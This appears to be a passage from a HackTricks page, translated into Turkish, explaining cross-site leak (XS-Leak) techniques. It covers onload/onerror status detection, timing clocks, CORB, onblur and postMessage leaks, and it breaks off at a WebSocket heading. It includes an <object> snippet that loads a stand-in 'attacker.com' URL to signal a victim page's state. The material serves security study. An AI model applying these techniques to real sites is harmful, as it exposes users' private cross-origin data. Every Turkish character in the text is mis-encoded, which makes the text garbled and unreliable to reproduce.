# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya** Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR'lar gÃ¶nderin.

</details>

## Temel Bilgiler

XS-Arama, **yan kanal zafiyetlerinden yararlanarak** **Ã§apraz kÃ¶kenli bilgileri Ã§Ä±karmak** iÃ§in kullanÄ±lan bir yÃ¶ntemdir.

Bu saldÄ±rÄ±da yer alan ana bileÅŸenler ÅŸunlardÄ±r:

* **ZararlÄ± Web**: Bilgilerin Ã§Ä±karÄ±lmasÄ± amaÃ§lanan hedef web sitesi.
* **SaldÄ±rganÄ±n Web'i**: SaldÄ±rgan tarafÄ±ndan oluÅŸturulan zararlÄ± web sitesi, kurbanÄ±n ziyaret ettiÄŸi ve saldÄ±rÄ±yÄ± barÄ±ndÄ±ran site.
* **Dahil Etme YÃ¶ntemi**: ZararlÄ± Web'i SaldÄ±rganÄ±n Web'ine dahil etmek iÃ§in kullanÄ±lan teknik (Ã¶rneÄŸin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **SÄ±zÄ±ntÄ± TekniÄŸi**: Dahil etme yÃ¶ntemi aracÄ±lÄ±ÄŸÄ±yla toplanan bilgilere dayanarak ZararlÄ± Web'in durumu arasÄ±ndaki farklarÄ± ayÄ±rt etmek iÃ§in kullanÄ±lan teknikler.
* **Durumlar**: SaldÄ±rganÄ±n ayÄ±rt etmeyi amaÃ§ladÄ±ÄŸÄ± ZararlÄ± Web'in iki potansiyel durumu.
* **AlgÄ±lanabilir Farklar**: SaldÄ±rganÄ±n ZararlÄ± Web'in durumunu Ã§Ä±karmak iÃ§in gÃ¼vendiÄŸi gÃ¶zlemlenebilir farklar.

### AlgÄ±lanabilir Farklar

ZararlÄ± Web'in durumlarÄ±nÄ± ayÄ±rt etmek iÃ§in birkaÃ§ yÃ¶n incelenebilir:

* **Durum Kodu**: **FarklÄ± HTTP yanÄ±t durum kodlarÄ±** arasÄ±ndaki ayrÄ±mÄ± yapmak, sunucu hatalarÄ±, istemci hatalarÄ± veya kimlik doÄŸrulama hatalarÄ± gibi Ã§apraz kÃ¶kenli olarak.
* **API KullanÄ±mÄ±**: Sayfalar arasÄ±nda **Web API'lerinin kullanÄ±mÄ±nÄ±** tanÄ±mlamak, Ã§apraz kÃ¶kenli bir sayfanÄ±n belirli bir JavaScript Web API'sini kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± ortaya Ã§Ä±karabilir.
* **YÃ¶nlendirmeler**: YalnÄ±zca HTTP yÃ¶nlendirmeler deÄŸil, aynÄ± zamanda JavaScript veya HTML tarafÄ±ndan tetiklenen farklÄ± sayfalara yÃ¶nlendirmeleri tespit etmek.
* **Sayfa Ä°Ã§eriÄŸi**: HTTP yanÄ±t gÃ¶vdesinde veya sayfa alt kaynaklarÄ±nda (Ã¶rneÄŸin, gÃ¶mÃ¼lÃ¼ Ã§erÃ§evelerin sayÄ±sÄ± veya gÃ¶rÃ¼ntÃ¼lerdeki boyut farklÄ±lÄ±klarÄ± gibi) **deÄŸiÅŸiklikleri gÃ¶zlemlemek**.
* **HTTP BaÅŸlÄ±ÄŸÄ±**: Belirli bir **HTTP yanÄ±t baÅŸlÄ±ÄŸÄ±nÄ±n** varlÄ±ÄŸÄ±nÄ± veya deÄŸerini belirlemek, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi baÅŸlÄ±klarÄ±n yanÄ± sÄ±ra.
* **Zamanlama**: Ä°ki durum arasÄ±ndaki tutarlÄ± zaman farklarÄ±nÄ± fark etmek.

### Dahil Etme YÃ¶ntemleri

* **HTML ElemanlarÄ±**: HTML, tarayÄ±cÄ±nÄ±n bir HTML dÄ±ÅŸÄ± kaynaÄŸÄ± istemesini saÄŸlayan stiller, gÃ¶rÃ¼ntÃ¼ler veya betikler gibi **Ã§apraz kÃ¶kenli kaynaklarÄ± dahil etmek iÃ§in Ã§eÅŸitli elemanlar sunar**. Bu amaÃ§la potansiyel HTML elemanlarÄ±nÄ±n derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Ã‡erÃ§eveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarÄ±nÄ± doÄŸrudan saldÄ±rganÄ±n sayfasÄ±na gÃ¶mebilir. SayfanÄ±n **Ã§erÃ§eve korumasÄ± olmadÄ±ÄŸÄ±nda**, JavaScript, Ã§erÃ§evelenmiÅŸ kaynaÄŸÄ±n window nesnesine contentWindow Ã¶zelliÄŸi aracÄ±lÄ±ÄŸÄ±yla eriÅŸebilir.
* **AÃ§Ä±lÄ±r Pencereler**: **`window.open`** yÃ¶ntemi, JavaScript'in SOP'u takip ederek yÃ¶ntemlere ve Ã¶zelliklere etkileÅŸimde bulunabileceÄŸi yeni bir sekmede veya pencerede bir kaynak aÃ§ar. SÄ±k â€‹â€‹kullanÄ±lan aÃ§Ä±lÄ±r pencereler, hedef kaynaÄŸÄ±n Ã§erÃ§eveleme ve Ã§erez kÄ±sÄ±tlamalarÄ±nÄ± atlatÄ±r. Ancak modern tarayÄ±cÄ±lar aÃ§Ä±lÄ±r pencerelerin oluÅŸturulmasÄ±nÄ± belirli kullanÄ±cÄ± eylemlerine sÄ±nÄ±rlar.
* **JavaScript Ä°stekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doÄŸrudan istekler yapÄ±lmasÄ±na izin verir. Bu yÃ¶ntemler, HTTP yÃ¶nlendirmelerini takip etmeyi seÃ§mek gibi isteÄŸi Ã¼zerinde hassas kontrol saÄŸlar.

### SÄ±zÄ±ntÄ± Teknikleri

* **Olay Ä°ÅŸleyici**: XS-SÄ±zÄ±ntÄ±larda klasik bir sÄ±zÄ±ntÄ± tekniÄŸi olan olay iÅŸleyicileri olan **onload** ve **onerror**, kaynaÄŸÄ±n yÃ¼klenme baÅŸarÄ±sÄ± veya baÅŸarÄ±sÄ±zlÄ±ÄŸÄ± hakkÄ±nda bilgi saÄŸlar.
* **Hata MesajlarÄ±**: JavaScript istisnalarÄ± veya Ã¶zel hata sayfalarÄ±, hata mesajÄ±ndan doÄŸrudan veya varlÄ±ÄŸÄ±nÄ±n ve yokluÄŸunun ayrÄ±mÄ±ndan bilgi saÄŸlayabilir.
* **Global SÄ±nÄ±rlar**: TarayÄ±cÄ±nÄ±n fiziksel sÄ±nÄ±rlarÄ±, bellek kapasitesi veya diÄŸer zorunlu tarayÄ±cÄ± sÄ±nÄ±rlarÄ± gibi, bir eÅŸiÄŸe ulaÅŸÄ±ldÄ±ÄŸÄ±nda sÄ±zÄ±ntÄ± tekniÄŸi olarak iÅŸlev gÃ¶rebilir.
* **Global Durum**: TarayÄ±cÄ±larÄ±n **global durumlarÄ±yla** (Ã¶rneÄŸin, GeÃ§miÅŸ arabirimi) algÄ±lanabilir etkileÅŸimler sÃ¶z konusu olduÄŸunda, sÃ¶z konusu durumlar sÃ¶mÃ¼rÃ¼lebilir. Ã–rneÄŸin, bir tarayÄ±cÄ±nÄ±n geÃ§miÅŸindeki **giriÅŸ sayÄ±sÄ±**, Ã§apraz kÃ¶kenli sayfalar hakkÄ±nda ipuÃ§larÄ± saÄŸlayabilir.
* **Performans API'si**: Bu API, mevcut sayfanÄ±n **performans detaylarÄ±nÄ±** saÄŸlar, belge ve yÃ¼klenen kaynaklar iÃ§in aÄŸ zamanlamasÄ±nÄ± iÃ§erir, istenen kaynaklar hakkÄ±nda Ã§Ä±karÄ±mlar yapmayÄ± mÃ¼mkÃ¼n kÄ±lar.
* **Okunabilir Ã–znitelikler**: BazÄ± HTML Ã¶znitelikleri **Ã§apraz kÃ¶kenli okunabilir** ve sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±labilir. Ã–rneÄŸin, `window.frame.length` Ã¶zelliÄŸi, JavaScript'in Ã§apraz kÃ¶kenli bir web sayfasÄ±ndaki Ã§erÃ§eveleri saymasÄ±na olanak tanÄ±r.

## XSinator AracÄ± ve Makale

XSinator, **makalesinde aÃ§Ä±klanan Ã§eÅŸitli bilinen XS-SÄ±zÄ±ntÄ±larÄ±na karÅŸÄ± tarayÄ±cÄ±larÄ± kontrol etmek iÃ§in otomatik bir araÃ§tÄ±r**: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

AraÃ§a [**https://xsinator.com/**](https://xsinator.com/) adresinden eriÅŸebilirsiniz.

{% hint style="warning" %}
**DÄ±ÅŸlanmÄ±ÅŸ XS-SÄ±zÄ±ntÄ±larÄ±**: DiÄŸer sÄ±zÄ±ntÄ±larÄ± XSinator'da engelleyeceÄŸi iÃ§in **hizmet iÅŸÃ§ilerine dayanan XS-SÄ±zÄ±ntÄ±larÄ±nÄ±** dÄ±ÅŸlamak zorunda kaldÄ±k. AyrÄ±ca, belirli bir web uygulamasÄ±ndaki yanlÄ±ÅŸ yapÄ±landÄ±rmalar ve hatalara dayanan XS-SÄ±zÄ±ntÄ±larÄ±nÄ± dÄ±ÅŸlamayÄ± tercih ettik. Ã–rneÄŸin, Cross-Origin Resource Sharing (CORS) yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±, postMessage sÄ±zÄ±ntÄ±larÄ± veya Cross-Site Scripting. AyrÄ±ca, genellikle yavaÅŸ, gÃ¼rÃ¼ltÃ¼lÃ¼ ve doÄŸru olmayan zaman tabanlÄ± XS-SÄ±zÄ±ntÄ±larÄ±nÄ± dÄ±ÅŸladÄ±k.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Zaman TabanlÄ± Teknikler**

AÅŸaÄŸÄ±daki tekniklerden bazÄ±larÄ±, web sayfalarÄ±nÄ±n olasÄ± durumlarÄ±ndaki farklÄ±lÄ±klarÄ± tespit etmek iÃ§in sÃ¼re Ã¶lÃ§Ã¼mÃ¼nÃ¼ kullanacak. Bir web tarayÄ±cÄ±sÄ±nda zamanÄ± Ã¶lÃ§menin farklÄ± yollarÄ± vardÄ±r.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliÅŸtiricilere yÃ¼ksek Ã§Ã¶zÃ¼nÃ¼rlÃ¼klÃ¼ zamanlama Ã¶lÃ§Ã¼mleri almasÄ±nÄ± saÄŸlar.\
SaldÄ±rganlarÄ±n zÄ±mni saatler oluÅŸturmak iÃ§in kÃ¶tÃ¼ye kullanabileceÄŸi Ã¶nemli sayÄ±da API vardÄ±r: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonlarÄ± ve diÄŸerleri.\
Daha fazla bilgi iÃ§in: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay Ä°ÅŸleyici Teknikleri

### Onload/Onerror

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Ã–zet**: Bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±rken onerror/onload olaylarÄ± tetiklendiÄŸinde kaynaÄŸÄ±n baÅŸarÄ±lÄ±/baÅŸarÄ±sÄ±z bir ÅŸekilde yÃ¼klendiÄŸi durum kodunu belirlemek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã¶rneÄŸi**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Kod Ã¶rneÄŸi, **JS'den script nesneleri yÃ¼klemeyi deniyor**, ancak **nesneler, stil sayfalarÄ±, resimler, sesler** gibi diÄŸer etiketler de kullanÄ±labilir. AyrÄ±ca, etiketi **doÄŸrudan enjekte etmek** ve `onload` ve `onerror` olaylarÄ±nÄ± etiketin iÃ§ine (JS'den enjekte etmek yerine) bildirmek de mÃ¼mkÃ¼ndÃ¼r.

Bu saldÄ±rÄ±nÄ±n ayrÄ±ca bir script olmayan versiyonu da bulunmaktadÄ±r:

```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```

### Onload Zamanlama

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Ã–zet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar zaman aldÄ±ÄŸÄ±nÄ± Ã¶lÃ§mek iÃ§in kullanÄ±labilir. Ancak, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diÄŸer saatler de kullanÄ±labilir, bu saatler 50 ms'den fazla sÃ¼ren gÃ¶revleri tanÄ±mlayabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) baÅŸka bir Ã¶rnek:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu AÄŸÄ±r GÃ¶rev

Bu teknik bir Ã¶ncekiyle aynÄ±dÄ±r, ancak **saldÄ±rgan** ayrÄ±ca **cevap olumlu veya olumsuz olduÄŸunda** bazÄ± eylemleri **ilgili bir sÃ¼re alacak ÅŸekilde zorlar** ve o sÃ¼reyi Ã¶lÃ§er.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Ã–zet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar zaman aldÄ±ÄŸÄ±nÄ± Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynaÄŸÄ±n alÄ±nmasÄ± iÃ§in geÃ§en sÃ¼re, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) etkinliklerini kullanarak Ã¶lÃ§Ã¼lebilir. **`beforeunload`** etkinliÄŸi tarayÄ±cÄ±nÄ±n yeni bir sayfaya geÃ§meye hazÄ±rlandÄ±ÄŸÄ± zaman tetiklenirken, **`unload`** etkinliÄŸi navigasyon gerÃ§ekleÅŸtiÄŸinde meydana gelir. Bu iki etkinlik arasÄ±ndaki zaman farkÄ±, tarayÄ±cÄ±nÄ±n kaynaÄŸÄ± almak iÃ§in harcadÄ±ÄŸÄ± sÃ¼reyi belirlemek iÃ§in hesaplanabilir.

### KumlanmÄ±ÅŸ Ã‡erÃ§eve Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Ã–zet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in ne kadar zaman aldÄ±ÄŸÄ±nÄ± Ã¶lÃ§mek iÃ§in kullanÄ±labilir. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadÄ±ÄŸÄ±nda, bir sayfa ve alt kaynaklarÄ±nÄ±n aÄŸ Ã¼zerinden yÃ¼klenmesi iÃ§in gereken sÃ¼re bir saldÄ±rgan tarafÄ±ndan Ã¶lÃ§Ã¼lebilir. Bu Ã¶lÃ§Ã¼m genellikle, bir iframe'in `onload` iÅŸleyicisinin, kaynak yÃ¼kleme ve JavaScript yÃ¼rÃ¼tmesinin tamamlanmasÄ±ndan sonra tetiklendiÄŸi iÃ§in mÃ¼mkÃ¼ndÃ¼r. Betik yÃ¼rÃ¼tmesi tarafÄ±ndan tanÄ±tÄ±lan deÄŸiÅŸkenliÄŸi atlamak iÃ§in bir saldÄ±rgan, `<iframe>` iÃ§inde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) Ã¶zniteliÄŸini kullanabilir. Bu Ã¶zniteliÄŸin eklenmesi, JavaScript'in yÃ¼rÃ¼tÃ¼lmesini kÄ±sÄ±tlayarak, Ã¶zellikle aÄŸ performansÄ± tarafÄ±ndan bÃ¼yÃ¼k Ã¶lÃ§Ã¼de etkilenen bir Ã¶lÃ§Ã¼mÃ¼ kolaylaÅŸtÄ±rÄ±r.

```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```

### #ID + hata + onload

* **Dahil Etme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**:
* **Ã–zet**: Sayfa doÄŸru iÃ§eriÄŸe eriÅŸildiÄŸinde hata almayÄ± saÄŸlayabilir ve herhangi bir iÃ§eriÄŸe eriÅŸildiÄŸinde doÄŸru ÅŸekilde yÃ¼klenmesini saÄŸlayabilirseniz, zamanÄ± Ã¶lÃ§meden tÃ¼m bilgileri Ã§Ä±karmak iÃ§in bir dÃ¶ngÃ¼ oluÅŸturabilirsiniz.
* **Kod Ã–rneÄŸi**:

Ã–rneÄŸin, **gizli** iÃ§eriÄŸe sahip **sayfayÄ±** bir **Iframe** iÃ§ine **yerleÅŸtirebileceÄŸinizi** varsayalÄ±m.

KurbanÄ±n "_**bayrak**_" iÃ§eren dosyayÄ± aramasÄ±nÄ± saÄŸlayabilirsiniz, bir **Iframe** kullanarak (Ã¶rneÄŸin CSRF'yi sÃ¶mÃ¼rerek). Iframe iÃ§inde, _**onload olayÄ±nÄ±n**_ en az bir kez **her zaman** gerÃ§ekleÅŸtirileceÄŸini biliyorsunuz. Sonra, **URL**'nin iÃ§indeki **hash**'in **yalnÄ±zca iÃ§eriÄŸini deÄŸiÅŸtirerek** Iframe'nin **URL**'sini deÄŸiÅŸtirebilirsiniz.

Ã–rneÄŸin:

1. **URL1**: www.saldÄ±rgan.com/xssearch#deneme1
2. **URL2**: www.saldÄ±rgan.com/xssearch#deneme2

Ä°lk URL **baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klendiÄŸinde**, URL'nin **hash** kÄ±smÄ±nÄ± **deÄŸiÅŸtirdiÄŸinizde**, **onload** olayÄ± **tekrar tetiklenmeyecek**. Ancak **sayfa** yÃ¼klenirken bir tÃ¼r **hata** varsa, o zaman **onload** olayÄ± **tekrar tetiklenecektir**.

Bu ÅŸekilde, **doÄŸru bir ÅŸekilde** yÃ¼klenen bir sayfa ile eriÅŸilen bir sayfa arasÄ±nda **ayÄ±rt edebilirsiniz**.

### Javascript YÃ¼rÃ¼tme

* **Dahil Etme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**:
* **Ã–zet:** EÄŸer **sayfa**, **duyarlÄ±** iÃ§eriÄŸi **geri dÃ¶ndÃ¼rÃ¼yorsa** veya kullanÄ±cÄ± tarafÄ±ndan **kontrol edilebilecek bir iÃ§erik**. KullanÄ±cÄ±, **geÃ§erli JS kodunu negatif durumda** ayarlayabilir ve her denemeyi **`<script>`** etiketleri iÃ§inde **yÃ¼kleme** yapabilir, bÃ¶ylece **negatif** durumlarda saldÄ±rganlarÄ±n **kodu** **yÃ¼rÃ¼tÃ¼lÃ¼r**, ve **olumlu** durumlarda **hiÃ§bir ÅŸey** yÃ¼rÃ¼tÃ¼lmez.
* **Kod Ã–rneÄŸi:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Durum Kodu ve BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Ã–zet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldÄ±rÄ±lara karÅŸÄ± korunmak iÃ§in belirli hassas Ã§apraz kÃ¶kenli kaynaklarÄ±n yÃ¼klenmesini engelleyen bir gÃ¼venlik Ã¶nlemidir. Ancak, saldÄ±rganlar koruyucu davranÄ±ÅŸÄ±nÄ± sÃ¶mÃ¼rebilir. **CORB**'a tabi bir yanÄ±t, `nosniff` ile korunan bir _**CORB korumalÄ±**_ `Content-Type` ile `2xx` durum kodu dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nde, **CORB** yanÄ±tÄ±n gÃ¶vdesini ve baÅŸlÄ±klarÄ±nÄ± sÄ±yÄ±rÄ±r. Bunu gÃ¶zlemleyen saldÄ±rganlar, **baÅŸarÄ±lÄ± veya hata iÃ§eren** sayfa arasÄ±ndaki **durum kodu** (baÅŸarÄ± veya hata gÃ¶steren) ve `Content-Type`'Ä±n (CORB tarafÄ±ndan korunup korunmadÄ±ÄŸÄ±nÄ± belirten) kombinasyonunu Ã§Ä±karabilir, potansiyel bilgi sÄ±zÄ±ntÄ±sÄ±na yol aÃ§abilir.
* **Kod Ã–rneÄŸi**:

SaldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in daha fazla bilgi baÄŸlantÄ±sÄ±nÄ± kontrol edin.

### onblur

* **Dahil Etme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Ã–zet**: ID veya ad Ã¶zniteliÄŸinden hassas veri sÄ±zdÄ±rma.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir **iframe** iÃ§ine bir sayfa **yÃ¼klemek** ve sayfanÄ±n **`#id_deÄŸeri`**'ni kullanarak, iframe'in elemanÄ±na odaklanmasÄ±nÄ± saÄŸlamak mÃ¼mkÃ¼ndÃ¼r, ardÄ±ndan bir **`onblur`** sinyali tetiklendiÄŸinde, ID elemanÄ± var olur.\
AynÄ± saldÄ±rÄ±yÄ± **`portal`** etiketleri ile gerÃ§ekleÅŸtirebilirsiniz.

### postMessage YayÄ±nlarÄ± <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Ã–zet**: Bir postMessage'dan hassas bilgileri toplamak veya postMessage'Ä±n varlÄ±ÄŸÄ±nÄ± bir orak olarak kullanarak kullanÄ±cÄ±nÄ±n sayfadaki durumunu bilmek.
* **Kod Ã–rneÄŸi**: `TÃ¼m postMessage'larÄ± dinleyen herhangi bir kod.`

Uygulamalar genellikle farklÄ± kÃ¶kenler arasÄ±nda iletiÅŸim kurmak iÃ§in [`postMessage` yayÄ±nlarÄ±nÄ±](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanÄ±r. Ancak, `targetOrigin` parametresinin doÄŸru ÅŸekilde belirtilmediÄŸi durumlarda bu yÃ¶ntem yanlÄ±ÅŸlÄ±kla **hassas bilgileri** ortaya Ã§Ä±karabilir, mesajlarÄ± almak iÃ§in herhangi bir pencereye izin verir. AyrÄ±ca, bir mesaj almanÄ±n sadece **bir orak** olarak hareket edebileceÄŸini unutmamak gerekir; Ã¶rneÄŸin, belirli mesajlar yalnÄ±zca oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±lara gÃ¶nderilebilir. Bu nedenle, bu mesajlarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, kullanÄ±cÄ±nÄ±n durumu veya kimliÄŸi hakkÄ±nda bilgi verebilir, Ã¶rneÄŸin oturum aÃ§mÄ±ÅŸ olup olmadÄ±klarÄ± gibi.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global SÄ±nÄ±rlar Teknikleri

### WebSocket API

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
